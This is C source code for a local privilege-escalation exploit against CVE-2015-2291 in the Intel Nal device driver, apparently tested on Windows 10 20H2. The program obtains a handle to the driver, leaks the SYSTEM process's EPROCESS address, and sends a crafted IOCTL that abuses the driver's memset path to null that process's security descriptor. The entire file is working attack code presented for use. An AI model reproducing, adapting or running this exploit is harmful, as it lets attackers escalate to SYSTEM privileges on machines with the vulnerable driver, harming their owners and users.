#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_nal = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	INPUT_BUFFER input_struct;
	unsigned char unused = 0, output[2048];
	unsigned long bytes_returned = 0;
	unsigned long long system_eprocess_address = 0;

	RtlSecureZeroMemory(&input_struct, sizeof(input_struct));
	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2015-2291");

	printf("[*] CVE-2015-2291 Intel Nal Device Driver Exploit\n[*] Exploit tested on Windows 10 20H2 x64 Build 19042.1110\n[*] Written by ExAllocatePool2\n[*] Press \"ENTER\" when you're ready...");
	unused = getchar();
	printf("[!] Lets exploit!");
	Sleep(1000);

	if (h_nal == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a driver handle to the Nal device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle to the Nal device driver. Handle Value: 0x%p", h_nal);

	system_eprocess_address = leak_system_eprocess_pointer();
	if (!system_eprocess_address)
	{
		return 1;
	}

	input_struct.JumpTableCode = 0x30;									// Hit the fully-controlled memset function code-path.
	input_struct.Destination = system_eprocess_address - 0x30 + 0x28;	// NULL out the SYSTEM process' security descriptor.
	input_struct.Length = 0x8 + 0x7;									// We need to adjust the length parameter by adding 0x7 to get the length we want.
	input_struct.Value = 0x00;											// Only one byte counts in this scenario.

	printf("\n[+] Crafted input structure.\n[!] Triggering vulnerability...");
	Sleep(3000);

	DeviceIoControl(h_nal, TARGET_IOCTL, &input_struct, sizeof(input_struct), &output, sizeof(output), &bytes_returned, 0);

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}